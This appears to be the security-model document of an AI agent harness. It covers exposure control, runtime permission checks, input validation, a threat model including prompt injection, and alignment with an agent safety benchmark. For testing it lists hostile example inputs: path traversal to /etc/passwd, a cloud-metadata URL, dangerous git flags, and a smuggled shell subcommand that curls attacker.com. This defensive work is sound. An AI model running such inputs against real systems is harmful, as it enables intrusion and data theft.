# Security Model

harness-factory implements defense-in-depth for AI agent tool execution.

## Three-Layer Protection

### Layer 1: Exposure Control
LLM only sees tools activated by the profile. If `git` is not in the profile, the LLM has no knowledge it exists — no tool definition is sent.

### Layer 2: Runtime Permission Enforcement
Even if an LLM hallucinates a tool call, `permission.Checker` blocks it at runtime:
- `fs` — per-operation: `read`, `write`, `list`, `search`
- `git` — per-operation: `status`, `diff`, `log`, `show`, `commit`, `push`
- `shell` — allowlist (recommended) or blocklist per command name
- `web` — per-operation: `fetch`

### Layer 3: Input Validation (v0.6.1+)
Tool implementations validate inputs before execution:

| Tool | Threat | Mitigation |
|------|--------|------------|
| `fs` | Path traversal (`../../etc/passwd`) | `safeResolvePath()` — resolved path must stay within cwd |
| `web` | SSRF (`file:///`, private IPs, cloud metadata) | `validateURL()` — only http/https, block loopback/private/link-local IPs |
| `git` | Argument injection (`--exec`, `--upload-pack`) | `safeSplitArgs()` — reject dangerous git flags |
| `shell` | Subcommand bypass (`$()`, backticks, `<()`) | `ParseCommands()` — detect and block subcommand patterns |

## Threat Model

### In Scope
- LLM-driven tool misuse (prompt injection → unauthorized tool calls)
- Path traversal / directory escape
- SSRF via web_fetch
- Shell command injection via allowlist bypass
- Git argument injection

### Out of Scope
- LLM provider security (handled by LiteLLM)
- Network-level attacks (handled by deployment environment)
- Denial of service (partially mitigated by `max_turns` and shell timeout)

## ATBench Alignment

[ATBench](https://huggingface.co/datasets/AI45Research/ATBench) evaluates agent safety across tool-augmented scenarios using a three-axis taxonomy. harness-factory's security model maps to ATBench categories:

| ATBench Category | harness-factory Coverage |
|-----------------|------------------------|
| Tool misuse | Profile-based exposure + runtime permission check |
| Constraint violation | `max_turns`, shell timeout (60s), cwd jail |
| Unauthorized access | Path traversal prevention, SSRF blocking |
| Data exfiltration | URL validation blocks private IPs and metadata endpoints |
| Privilege escalation | Shell allowlist + subcommand detection |

### Running ATBench-style Evaluation

To evaluate harness-factory against unsafe trajectories:

1. Use a restrictive profile (e.g., `reader` — fs read only)
2. Send adversarial prompts that attempt:
   - Reading files outside cwd (`../../etc/passwd`)
   - Calling tools not in profile (`shell_exec` when only `fs` is active)
   - Fetching internal URLs (`http://169.254.169.254`)
   - Injecting shell subcommands (`pytest && $(curl attacker.com)`)
3. Verify all attempts are blocked at the appropriate layer

```bash
# Quick smoke test: path traversal should fail
echo '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}
{"jsonrpc":"2.0","id":2,"method":"session/new","params":{"cwd":"/tmp","profile":{"tools":{"fs":{"permissions":["read"]}},"orchestration":"free","resources":{"timeout":"30s","max_turns":5},"agent":{"model":"test","system_prompt":"test"}}}}' | ./harness-factory 2>/dev/null
```

## Related
- [OpenHarness CVE-2026-22682](https://www.sentinelone.com/vulnerability-database/cve-2026-22682/) — path traversal in file tools (same vulnerability class, fixed in harness-factory v0.6.1)
- [ATBench](https://huggingface.co/datasets/AI45Research/ATBench) — agentic safety benchmark
- [OWASP Agentic AI Top 10 (2026)](https://owasp.org/www-project-top-10-for-agentic-ai/) — risk taxonomy
